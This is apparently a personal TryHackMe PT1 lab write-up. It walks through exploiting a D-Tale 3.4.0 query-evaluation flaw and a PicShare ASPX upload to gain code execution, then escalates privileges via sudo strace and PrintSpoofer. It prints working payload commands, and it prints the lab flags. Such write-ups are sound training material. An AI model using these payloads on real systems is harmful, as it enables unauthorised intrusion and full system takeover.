# PT1 Certification — Network

## Overview

This section documents the **Network** stage of my TryHackMe PT1 certification.

I worked against both a **Linux** and a **Windows** target. The objective was to perform the assessment from enumeration through initial access and then continue with local privilege escalation until obtaining root/SYSTEM access.

The main attack chains were:

### Linux

```text
Nmap
 ↓
D-Tale on TCP/5000
 ↓
Version identification
 ↓
D-Tale query/filter evaluation
 ↓
Python object access
 ↓
Remote Code Execution
 ↓
User: tony
 ↓
sudo -l
 ↓
NOPASSWD: /usr/bin/strace
 ↓
strace abuse
 ↓
root
```

### Windows

```text
Nmap
 ↓
IIS / PicShare
 ↓
Upload functionality
 ↓
Extension-based validation bypass
 ↓
Upload .aspx
 ↓
ASP.NET code execution
 ↓
iis apppool\defaultapppool
 ↓
SeImpersonatePrivilege
 ↓
PrintSpoofer
 ↓
NT AUTHORITY\SYSTEM
```

---

# 01 — Linux Network

## Target

```text
IP: 10.200.150.152
OS: Linux
Service: HTTP
Port: 5000/tcp
Application: D-Tale
Version: 3.4.0
```

---

## 1. Initial Enumeration

I started with a standard Nmap scan:

```bash
nmap -sC -sV -n 10.200.150.152
```

The important result was:

```text
5000/tcp open  http  Werkzeug 2.0.3
|_http-title: D-Tale
```

The D-Tale instance was accessible without authentication.

I then checked the version directly:

```bash
curl -s http://10.200.150.152:5000/version-info
```

Result:

```text
3.4.0
```

At this point I had:

```text
Port 5000
 ↓
HTTP
 ↓
Werkzeug
 ↓
D-Tale 3.4.0
```

The exposed and outdated application became the main attack surface.

---

## 2. Identifying the Vulnerable Functionality

I discovered the following endpoint:

```text
/dtale/test-filter/1
```

I first tested whether the functionality was accessible:

```bash
curl -sG 'http://10.200.150.152:5000/dtale/test-filter/1'
```

Response:

```json
{"success":true}
```

This confirmed that the filter functionality was exposed.

---

## 3. Understanding the Query Evaluation

Instead of immediately attempting command execution, I first tried to understand how my input was processed.

I submitted:

```text
query=1 == 1
```

The resulting traceback showed the following execution path:

```text
dtale/views.py
    test_filter()
        ↓
dtale/query.py
    run_query()
        ↓
pandas/core/frame.py
    DataFrame.query()
```

This was important because it showed that attacker-controlled input was reaching:

```python
DataFrame.query()
```

So the next step was to determine what objects were accessible inside that evaluation context.

---

## 4. Python Object Access

I tested access to the Pandas module using `@`:

```bash
curl -sG 'http://10.200.150.152:5000/dtale/test-filter/1' \
  --data-urlencode 'query=@pd.__version__'
```

The response contained:

```text
2.2.3
```

Therefore:

```text
@pd
 ↓
pandas module

@pd.__version__
 ↓
2.2.3
```

I then tested access to Python built-ins:

```bash
curl -sG 'http://10.200.150.152:5000/dtale/test-filter/1' \
  --data-urlencode 'query=@__builtins__["len"]'
```

The response returned:

```text
51
```

This demonstrated that Python objects and built-ins were accessible from the query evaluation environment.

---

## 5. Remote Code Execution

Once I understood that Python objects were accessible, I tested whether this could reach OS-level command execution.

I used:

```bash
curl -sG 'http://10.200.150.152:5000/dtale/test-filter/1' \
  --data-urlencode "query=@pd.core.frame.com.builtins.__import__('os').popen('id').read()"
```

The response showed:

```text
uid=1001(tony) gid=1001(tony) groups=1001(tony),100(users)
```

This confirmed arbitrary OS command execution.

My execution context was:

```text
User: tony
UID: 1001
GID: 1001
Groups: tony, users
```

So the complete initial-access chain was:

```text
D-Tale 3.4.0
 ↓
/dtale/test-filter/1
 ↓
DataFrame.query()
 ↓
Python object access
 ↓
os.popen()
 ↓
OS command execution
 ↓
tony
```

---

## 6. Linux Initial Access Flag

I used the same RCE primitive to read the user flag:

```bash
curl -sG 'http://10.200.150.152:5000/dtale/test-filter/1' \
  --data-urlencode "query=@pd.core.frame.com.builtins.__import__('os').popen('cat /user.txt').read()"
```

Flag:

```text
THM{2121abdf-30f8-4b4c-a21f-fe40ef91a748}
```

Initial access was now complete.

```text
Enumeration
 ↓
D-Tale 3.4.0
 ↓
Vulnerable filter functionality
 ↓
Python expression evaluation
 ↓
RCE
 ↓
tony
 ↓
/user.txt
 ↓
THM{2121abdf-30f8-4b4c-a21f-fe40ef91a748}
```

---

# 02 — Linux Privilege Escalation

After obtaining initial access as `tony`, I moved on to local privilege-escalation enumeration.

---

## 1. Sudo Enumeration

My first check was:

```bash
sudo -l
```

The important result was:

```text
User tony may run the following commands on lin1:

    (ALL) NOPASSWD: /usr/bin/strace
```

This means that `tony` could execute:

```text
/usr/bin/strace
```

as any user, including root, without entering a password.

The privilege chain was therefore:

```text
tony
 ↓
sudo
 ↓
/usr/bin/strace
 ↓
root
```

This was the critical privilege-escalation finding.

---

## 2. Why `strace` Was Dangerous

`strace` is normally a Linux system-call tracing/debugging utility.

The problem was not simply that `strace` was installed.

The dangerous configuration was:

```text
(ALL) NOPASSWD: /usr/bin/strace
```

Because `strace` could be executed as root, I could use it to launch another process inside the privileged execution context.

The important pentesting thought process was:

```text
What can my current user execute?
        ↓
Can I execute it as another user?
        ↓
Can I execute it as root?
        ↓
Can the permitted binary launch another process?
        ↓
Can I obtain root execution?
```

---

## 3. Exploiting `strace`

I tested the permission with:

```bash
sudo /usr/bin/strace -o /dev/null /bin/sh -c "id"
```

The result was:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed root-level command execution.

The attack chain was:

```text
tony
 ↓
sudo -l
 ↓
NOPASSWD: /usr/bin/strace
 ↓
sudo strace
 ↓
/bin/sh
 ↓
uid=0(root)
```

---

## 4. Linux Root Flag

Once root execution was confirmed, I read:

```text
/root/root.txt
```

The command used through the same RCE primitive was:

```bash
curl -sG 'http://10.200.150.152:5000/dtale/test-filter/1' \
  --data-urlencode "query=@pd.core.frame.com.builtins.__import__('os').popen('sudo /usr/bin/strace -o /dev/null /bin/sh -c \"cat /root/root.txt\"').read()"
```

Root flag:

```text
THM{0da84285-2f05-4db4-9154-1bfcbed4f943}
```

---

## 5. Linux Finding

### Vulnerability

```text
Insecure Sudo/SUID Configuration
```

### Affected User

```text
tony
```

### Vulnerable Configuration

```text
(ALL) NOPASSWD: /usr/bin/strace
```

### Impact

A low-privileged user could execute `strace` with root privileges and use it to launch a shell, resulting in complete root-level command execution.

### Final Attack Chain

```text
D-Tale RCE
 ↓
tony (UID 1001)
 ↓
sudo -l
 ↓
/usr/bin/strace
 ↓
sudo strace
 ↓
/bin/sh
 ↓
root (UID 0)
 ↓
/root/root.txt
 ↓
THM{0da84285-2f05-4db4-9154-1bfcbed4f943}
```

---

# 03 — Windows Network

## Target

```text
IP: 10.200.150.151
OS: Windows
Perspective: Internal network
```

---

## 1. Initial Enumeration

I started with:

```bash
nmap -sC -sV -n 10.200.150.151
```

Open ports:

```text
80/tcp    HTTP   Microsoft IIS 10.0
135/tcp   MSRPC
139/tcp   NetBIOS
445/tcp   SMB
3389/tcp  RDP
```

The main web application was:

```text
PicShare - Home
```

RDP enumeration also revealed:

```text
Target_Name: WIN
NetBIOS_Domain_Name: WIN
NetBIOS_Computer_Name: WIN
Product_Version: 10.0.17763
```

I also checked SMB signing:

```text
Message signing enabled but not required
```

---

## 2. SMB Enumeration

I tested anonymous SMB access:

```bash
smbclient -L //10.200.150.151 -N
```

Result:

```text
NT_STATUS_ACCESS_DENIED
```

I also tested anonymous RPC:

```bash
rpcclient -U "" -N 10.200.150.151
```

Anonymous access was not available.

Therefore, SMB/RPC did not immediately provide a useful unauthenticated entry point.

I moved my focus to the HTTP service.

---

# 04 — PicShare Web Enumeration

Port 80 hosted an image-sharing application called **PicShare**.

The application described itself as:

```text
A lightweight image sharing platform — no account required.
```

The available functionality included:

```text
Index.aspx
Upload.aspx
```

The upload page contained:

```text
Upload an Image
Browse
Upload Image
```

The HTML showed an ASP.NET Web Forms application using:

```http
POST /Upload.aspx
Content-Type: multipart/form-data
```

The upload parameter was:

```text
ImageUpload
```

This immediately made the file-upload functionality an important area to test.

---

# 05 — File Upload Testing

## 1. Normal File

I first uploaded a `.txt` file.

The application responded:

```text
Only image files are allowed
```

This showed that the application performed some server-side validation based on the filename/extension.

---

## 2. Extension Validation Bypass

I renamed a text file to:

```text
test.jpg
```

The file was accepted.

This showed that the application trusted the extension and did not properly verify that the uploaded content was actually an image.

The application stored uploaded files under:

```text
/UserUploads/
```

The home page also revealed uploaded files through paths such as:

```html
<img src='UserUploads/test.jpg' />
<img src='UserUploads/test.png' />
```

This was important because it suggested that uploaded files were directly accessible through the web server.

---

# 06 — ASP.NET File Upload to Code Execution

Because the target was running:

```text
Microsoft IIS
ASP.NET
```

and the upload validation appeared to rely primarily on the extension, I tested whether an ASP.NET server-side file could be uploaded.

I uploaded a harmless `.aspx` page:

```aspx
<%@ Page Language="C#" %><% Response.Write("UPLOAD_TEST"); %>
```

The `.aspx` file was accepted.

I then accessed:

```text
http://10.200.150.151/UserUploads/test.aspx
```

The server returned:

```text
UPLOAD_TEST
```

This was the critical confirmation.

The file was not simply being stored as a static document.

IIS/ASP.NET was actually executing the uploaded server-side code.

Therefore, the vulnerability was confirmed as:

```text
Unrestricted File Upload (Custom App)
```

The attack chain was:

```text
Unauthenticated PicShare
 ↓
Upload.aspx
 ↓
Extension-based validation
 ↓
.aspx accepted
 ↓
/UserUploads/
 ↓
IIS/ASP.NET executes file
 ↓
Server-side code execution
```

---

# 07 — Windows Initial Access Flag

After confirming ASP.NET code execution, I used another ASPX page to read the Windows user flag:

```aspx
<%@ Page Language="C#" %><% Response.Write(System.IO.File.ReadAllText(@"C:\user.txt")); %>
```

The uploaded file was accessed through:

```text
http://10.200.150.151/UserUploads/flag.aspx
```

Initial access flag:

```text
THM{a37afe3d-7566-44b0-903b-d824d7e689b5}
```

The execution context was the IIS application pool identity:

```text
iis apppool\defaultapppool
```

---

# 08 — Windows Initial Access Finding

### Vulnerability

```text
Unrestricted File Upload (Custom App)
```

### Severity

```text
High
```

### Root Cause

The application relied on insufficient extension-based validation and allowed executable ASP.NET files to be uploaded into a web-accessible directory.

### Impact

An unauthenticated attacker could upload an ASPX file and have IIS/ASP.NET execute arbitrary server-side code.

### Attack Path

```text
Unauthenticated access to PicShare
        ↓
Upload functionality
        ↓
Extension-based validation
        ↓
.aspx file accepted
        ↓
File stored in /UserUploads/
        ↓
IIS/ASP.NET executes uploaded .aspx
        ↓
Arbitrary server-side code execution
        ↓
C:\user.txt
        ↓
Initial access flag
```

---

# 09 — Windows Privilege Escalation

After obtaining code execution as:

```text
iis apppool\defaultapppool
```

I started local privilege-escalation enumeration.

The first important check was:

```cmd
whoami /priv
```

The critical result was:

```text
SeImpersonatePrivilege    Enabled
```

---

## 1. Understanding `SeImpersonatePrivilege`

`SeImpersonatePrivilege` allows a process to impersonate a security token that it has obtained.

This is especially interesting when the current account is a service account.

In this case:

```text
iis apppool\defaultapppool
```

was running with:

```text
SeImpersonatePrivilege
```

This gave me the following escalation hypothesis:

```text
Low-privileged service account
        ↓
SeImpersonatePrivilege
        ↓
Token impersonation
        ↓
SYSTEM
```

---

## 2. Additional Enumeration

I also checked scheduled tasks:

```cmd
schtasks
```

There was no obvious custom scheduled task that provided a useful privilege-escalation path.

Therefore, the most important privilege-based finding remained:

```text
SeImpersonatePrivilege
```

---

# 10 — Exploiting `SeImpersonatePrivilege`

I used **PrintSpoofer**, a tool designed to abuse `SeImpersonatePrivilege`.

The binary was transferred to:

```text
C:\Windows\Temp\PrintSpoofer64.exe
```

It was then executed to create a process with SYSTEM privileges.

After successful exploitation, I checked the current identity:

```cmd
whoami
```

The result was:

```text
nt authority\system
```

This confirmed successful privilege escalation.

The complete chain was:

```text
PicShare
 ↓
Unrestricted File Upload
 ↓
Upload .aspx
 ↓
ASP.NET Code Execution
 ↓
iis apppool\defaultapppool
 ↓
SeImpersonatePrivilege
 ↓
PrintSpoofer
 ↓
Token Impersonation
 ↓
NT AUTHORITY\SYSTEM
```

---

# 11 — Windows Root Flag

From the SYSTEM context, I read:

```cmd
type C:\Users\Administrator\root.txt
```

Root flag:

```text
THM{3490cd2e-73c5-4ac3-aac9-4825663be72f}
```

---

# 12 — Windows Privilege Escalation Finding

### Vulnerability

```text
Insecure Capability/Privilege Configuration
```

### Root Cause

`SeImpersonatePrivilege` was available to the IIS application pool identity and could be abused for privilege escalation.

### Impact

An attacker who already obtained code execution through the web application could escalate from the IIS application pool context to:

```text
NT AUTHORITY\SYSTEM
```

### Attack Chain

```text
PicShare
 ↓
Unrestricted File Upload
 ↓
.aspx upload
 ↓
ASP.NET code execution
 ↓
iis apppool\defaultapppool
 ↓
SeImpersonatePrivilege
 ↓
PrintSpoofer
 ↓
SYSTEM
 ↓
C:\Users\Administrator\root.txt
 ↓
THM{3490cd2e-73c5-4ac3-aac9-4825663be72f}
```

---

# 13 — Key Pentesting Lessons

## Linux

The most important lesson from the Linux target was not just knowing a specific D-Tale vulnerability.

The useful methodology was:

```text
Enumeration
 ↓
Identify exposed software
 ↓
Determine exact version
 ↓
Identify interesting functionality
 ↓
Trace attacker-controlled input
 ↓
Understand how the application evaluates it
 ↓
Test controlled expressions
 ↓
Confirm command execution
 ↓
Obtain initial access
 ↓
Perform local enumeration
 ↓
sudo -l
 ↓
Identify dangerous permissions
 ↓
Abuse permitted binary
 ↓
Root
```

The important commands were:

```bash
nmap -sC -sV -n 10.200.150.152

curl -s http://10.200.150.152:5000/version-info

curl -sG 'http://10.200.150.152:5000/dtale/test-filter/1'

sudo -l

sudo /usr/bin/strace -o /dev/null /bin/sh -c "id"
```

The biggest privilege-escalation takeaway was:

```text
Always check sudo -l after obtaining Linux access.
```

---

## Windows

The Windows target reinforced the importance of testing functionality instead of stopping at the initial service enumeration.

The main methodology was:

```text
Nmap
 ↓
Identify IIS
 ↓
Enumerate web application
 ↓
Identify upload functionality
 ↓
Test validation
 ↓
Bypass extension restriction
 ↓
Test executable server-side file
 ↓
Confirm ASP.NET execution
 ↓
Initial access
 ↓
whoami /priv
 ↓
Identify SeImpersonatePrivilege
 ↓
Privilege escalation
 ↓
SYSTEM
```

The important commands were:

```bash
nmap -sC -sV -n 10.200.150.151
```

and, after obtaining Windows execution:

```cmd
whoami /priv
schtasks
whoami
type C:\Users\Administrator\root.txt
```

The main lesson was:

```text
After obtaining code execution on Windows,
always enumerate the privileges of the current process.
```

A service account with:

```text
SeImpersonatePrivilege
```

should immediately become an important privilege-escalation hypothesis.

---

# 14 — Final Results

| Target | Initial Access | Privilege Escalation | Final Context |
|---|---|---|---|
| Linux — 10.200.150.152 | D-Tale RCE | sudo `strace` | root |
| Windows — 10.200.150.151 | ASPX Unrestricted File Upload | SeImpersonatePrivilege + PrintSpoofer | SYSTEM |

## Linux Flags

```text
User:
THM{2121abdf-30f8-4b4c-a21f-fe40ef91a748}

Root:
THM{0da84285-2f05-4db4-9154-1bfcbed4f943}
```

## Windows Flags

```text
User:
THM{a37afe3d-7566-44b0-903b-d824d7e689b5}

Root:
THM{3490cd2e-73c5-4ac3-aac9-4825663be72f}
```

---

# 15 — Overall Attack Chains

## Linux

```text
10.200.150.152
        ↓
TCP/5000
        ↓
D-Tale 3.4.0
        ↓
/dtale/test-filter/1
        ↓
DataFrame.query()
        ↓
Python object access
        ↓
os.popen()
        ↓
RCE
        ↓
tony
        ↓
/user.txt
        ↓
User Flag
        ↓
sudo -l
        ↓
NOPASSWD: /usr/bin/strace
        ↓
sudo strace
        ↓
/bin/sh
        ↓
root
        ↓
/root/root.txt
        ↓
Root Flag
```

## Windows

```text
10.200.150.151
        ↓
TCP/80
        ↓
IIS 10.0
        ↓
PicShare
        ↓
Upload.aspx
        ↓
Extension validation bypass
        ↓
Upload .aspx
        ↓
IIS/ASP.NET execution
        ↓
iis apppool\defaultapppool
        ↓
C:\user.txt
        ↓
User Flag
        ↓
whoami /priv
        ↓
SeImpersonatePrivilege
        ↓
PrintSpoofer
        ↓
NT AUTHORITY\SYSTEM
        ↓
C:\Users\Administrator\root.txt
        ↓
Root Flag
```

---

# 16 — Final Takeaways

The Network stage reinforced several things I want to carry into future pentests:

### 1. Enumeration comes first

I should not immediately jump to exploitation.

```text
Ports
 ↓
Services
 ↓
Versions
 ↓
Applications
 ↓
Functionality
 ↓
Potential attack surface
```

### 2. Version detection is only the beginning

Finding:

```text
D-Tale 3.4.0
```

was useful, but the real breakthrough came from understanding how the vulnerable functionality processed the `query` parameter.

### 3. Test application functionality

On Windows, the important discovery was not SMB or RDP.

It was:

```text
PicShare
 ↓
Upload functionality
```

Testing how the application validated uploaded files led to code execution.

### 4. After initial access, enumerate locally

Linux:

```bash
sudo -l
```

Windows:

```cmd
whoami /priv
```

These two checks immediately exposed the relevant privilege-escalation paths.

### 5. Think in attack chains

The objective is not simply:

```text
Find vulnerability
```

It is:

```text
Recon
 ↓
Enumeration
 ↓
Initial Access
 ↓
Privilege Escalation
 ↓
Proof of Impact
 ↓
Document the chain
```

For this Network stage, both targets ultimately followed that complete methodology.